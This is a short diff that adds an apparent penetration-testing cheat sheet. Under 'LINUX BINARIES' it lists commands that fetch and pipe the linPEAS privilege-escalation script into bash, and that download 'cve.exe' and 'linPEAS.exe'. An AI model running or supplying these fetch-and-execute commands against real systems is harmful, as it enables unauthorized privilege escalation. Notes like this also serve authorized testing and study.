@@ -1,0 +1,10 @@
+LINUX BINARIES
+
+curl -L linpeas.sh | bash
+
+wget cve.exe
+
+wget linPEAS.exe
+
+
+WINDOWS BINARIES
